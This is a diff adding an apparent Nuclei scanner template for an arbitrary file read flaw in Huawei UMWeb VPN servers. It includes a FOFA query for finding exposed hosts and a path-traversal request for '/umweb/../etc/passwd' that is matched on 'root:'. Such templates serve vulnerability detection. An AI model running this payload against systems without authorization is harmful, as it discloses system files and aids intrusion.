@@ -1,0 +1,32 @@
+id: huawei-vpn-umweb-fileread
+
+info:
+  name: "华为UMWeb任意文件读取漏洞"
+  author: hufei
+  severity: medium
+  description: 华为vpn任意文件读取
+  tags: Huawei,UMWeb
+  metadata:
+    fofa-qeury: server="Huawei Auth-Http Server 1.0"
+    veified: true
+
+http:
+  - method: GET
+    path: 
+      - "{{RootURL}}/umweb/../etc/passwd"
+      - "{{RootURL}}/umweb/passwd"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+
+      - type: status
+        status:
+          - 200
+
+
+
